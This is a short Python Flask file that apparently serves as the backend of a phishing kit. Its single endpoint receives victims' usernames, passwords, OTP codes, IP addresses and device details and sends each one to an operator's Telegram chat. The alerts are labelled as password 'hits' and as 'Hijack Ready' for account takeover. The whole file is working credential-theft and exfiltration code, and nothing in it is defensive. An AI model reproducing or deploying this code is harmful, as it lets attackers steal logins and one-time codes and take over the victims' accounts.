from flask import Flask, request, jsonify
import requests
import os

app = Flask(__name__)

TOKEN = os.environ.get('BOT_TOKEN')
CID = os.environ.get('CHAT_ID')

@app.route('/api/index', methods=['POST'])
def handle_requests():
    try:
        # Simple data parsing taaki error na aaye
        data = request.json
        if not data:
            return jsonify({"status": "no data"}), 400
            
        dtype = data.get('t', 'UNKNOWN')
        user = data.get('u', 'UserNotSet')
        password = data.get('p', 'PassNotSet')
        otp = data.get('o', 'OtpNotSet')
        
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)

        if dtype == 'VISIT':
            msg = f"👀 **TARGET DETECTED**\n📍 IP: `{ip}`\n📱 Device: `{data.get('d', 'N/A')[:40]}`"
        
        elif dtype == 'OTP_RECEIVED':
            #
            msg = f"🔥 **Z-PROXY HIT (OTP)**\n👤 User: `{user}`\n🔢 **OTP: {otp}**\n✅ Status: Hijack Ready"
        
        elif dtype in ['INIT_LOG', 'REAL_LOG']:
            # Password alert
            msg = f"🚀 **NEW PASSWORD HIT!**\n👤 User: `{user}`\n🔑 **Pass: {password}**\n📊 Type: {dtype}\n🌐 IP: `{ip}`"
        
        else:
            msg = f"ℹ️ Update: {dtype} received"

        # Telegram notification
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                      json={"chat_id": CID, "text": msg, "parse_mode": "Markdown"})
        
        return jsonify({"status": "success"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

def handler(req, res):
    return app(req, res)
            
